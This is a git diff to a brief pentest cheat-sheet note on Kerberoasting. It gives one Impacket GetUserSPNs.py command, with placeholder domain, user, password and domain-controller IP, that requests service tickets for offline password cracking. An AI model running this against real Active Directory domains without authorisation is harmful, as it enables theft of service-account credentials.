@@ -1,9 +1,9 @@
 
 # Kerberoasting
 
-Get SPN's (servicies) from DC
+Get SPN's (servicies) from DC. Get TGS of the servicies
 
-> get all TGS for servicies
+> Impacket
 ```
 GetUserSPNs.py $domain/$user:#password -dc-ip $ip_addres_of_dc -request
 ```
